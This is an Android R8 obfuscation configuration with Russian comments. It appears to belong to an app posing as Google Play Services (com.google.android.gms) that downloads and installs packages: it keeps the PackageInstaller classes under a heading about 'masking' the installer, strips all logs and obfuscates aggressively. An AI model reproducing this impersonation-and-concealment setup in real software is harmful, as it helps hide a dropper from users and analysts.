# ===== МАКСИМАЛЬНАЯ ЗАЩИТА ДЛЯ R8 =====

# Сохраняем точку входа (иначе приложение не запустится)
-keep public class com.google.android.gms.MainActivity {
    public *;
}
-keep public class com.google.android.gms.MainActivity$* {
    public *;
}

# Сохраняем системные классы Android (обязательно)
-keep class android.content.pm.** { *; }
-keep class android.app.** { *; }
-keep class android.os.** { *; }
-keep class android.net.** { *; }
-keep class android.widget.** { *; }

# Сохраняем AndroidX (обязательно)
-keep class androidx.core.** { *; }
-dontwarn androidx.**

# Сохраняем FileProvider (обязательно для установки)
-keep class androidx.core.content.FileProvider { *; }

# ===== АГРЕССИВНАЯ ОБФУСКАЦИЯ R8 =====

# Переименовываем все классы в короткие имена в корневой пакет
-repackageclasses 'a'

# Разрешаем изменение модификаторов доступа для оптимизации
-allowaccessmodification

# Агрессивная перегрузка методов (одинаковые имена для разных методов)
-overloadaggressively

# Оптимизация на максимум
-optimizationpasses 5

# Вырезаем все логи
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
    public static *** wtf(...);
}

# Вырезаем проверки на null (оптимизация)
-assumenosideeffects class java.util.Objects {
    public static *** requireNonNull(...);
}

# Удаляем всю отладочную информацию
-dontnote **
-dontwarn **
-ignorewarnings

# Не сохраняем имена файлов и строки
-adaptresourcefilenames    **.png,**.jpg,**.xml,**.properties,**.txt
-adaptresourcefilecontents **.properties,META-INF/MANIFEST.MF

# Сжимаем строки в коде
-mergeinterfacesaggressively

# Удаляем неиспользуемый код AndroidX (безопасно)
-dontwarn androidx.**
-keep class androidx.** { *; }
-keepclassmembers class androidx.** { *; }

# Сохраняем JavaScript интерфейсы (если есть WebView)
-keepattributes JavascriptInterface
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}

# ===== МАСКИРОВКА PACKAGE INSTALLER =====
# Не даём R8 вырезать критичные вызовы
-keep class android.content.pm.PackageInstaller { *; }
-keep class android.content.pm.PackageInstaller$Session { *; }
-keep class android.content.pm.PackageInstaller$SessionParams { *; }
-keep class android.content.pm.PackageManager { *; }

# Сохраняем HTTP соединения
-keep class java.net.** { *; }
-keep class javax.net.** { *; }
-keep class com.android.org.conscrypt.** { *; }

# ===== СПЕЦИФИЧЕСКИЕ ПРАВИЛА ДЛЯ R8 =====
# Отключаем предупреждения о недостающих классах
-dontwarn java.lang.invoke.**
-dontwarn javax.annotation.**
-dontwarn javax.inject.**
-dontwarn sun.misc.Unsafe